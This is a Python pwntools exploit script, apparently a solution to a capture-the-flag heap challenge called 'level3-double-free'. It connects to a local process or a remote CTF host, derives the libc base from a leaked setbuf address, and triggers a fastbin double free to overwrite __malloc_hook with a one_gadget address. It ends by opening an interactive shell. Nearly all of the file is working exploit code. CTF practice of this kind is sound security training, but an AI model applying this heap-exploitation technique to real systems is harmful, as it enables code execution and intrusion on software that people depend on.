#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level3-double-free"
elf=ELF(pwn_file)
libc=elf.libc
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22503)
    pid=0


def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()


def addnote(content = ''):
    r.recvuntil(">> ")
    r.sendline("1")
    r.recvuntil("Content: ")
    if content:
      r.sendline(content)
    else:
      r.sendline('abc')

def deletenote(nid):
    r.recvuntil(">> ")
    r.sendline("3")
    r.recvuntil("Input your id:")
    r.sendline(str(nid))


setbuf_addr = r.recvline()[-15:-1]
setbuf_addr = int(setbuf_addr,16)
libc.address = setbuf_addr - libc.sym["setbuf"]
print hex(libc.address)

addnote() #0
addnote() #1
deletenote(0) 
deletenote(1)
deletenote(0)

#first_address = p64(0x602500)
malloc_block = libc.sym['__malloc_hook'] -0x23 

print hex(malloc_block)
addnote(p64(malloc_block)) #2
addnote() #3
addnote() #4


one_gadget = 0xf02a4
sh_addr = libc.address + one_gadget
payload2 = 'a'*19 + p64(sh_addr)
addnote(payload2) #5

 # trigger
'''
r.sendline("1")
r.recvuntil("Content: ")
r.send('abc')
'''
deletenote(3)

r.recvuntil(">> ")
r.sendline("3")
r.recvuntil("Input your id:")
debug()
r.sendline("3")
r.interactive()
